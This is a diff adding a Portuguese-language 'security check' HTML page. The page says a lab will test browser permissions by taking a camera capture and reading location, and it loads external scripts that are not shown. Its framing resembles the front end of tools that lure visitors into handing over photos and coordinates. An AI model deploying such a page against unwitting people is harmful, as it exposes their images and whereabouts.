@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="pt-br">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificação de Segurança</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin-top: 15%;
+        background: #121212;
+        color: white;
+      }
+      .loader {
+        border: 5px solid #333;
+        border-top: 5px solid #2196f3;
+        border-radius: 50%;
+        width: 45px;
+        height: 45px;
+        margin: 25px auto;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      .status {
+        color: #aaa;
+        margin-top: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>Verificação de Segurança</h2>
+    <p>Este laboratório verificará permissões do navegador.</p>
+    <p>
+      Câmera: utilizada para uma captura de teste.<br />
+      Localização: utilizada para obter coordenadas de teste.
+    </p>
+
+    <div class="loader" id="loader" hidden></div>
+    <p class="status" id="status">Iniciando verificação...</p>
+
+    <script src="./config.js"></script>
+    <script src="./script.js"></script>
+  </body>
+</html>
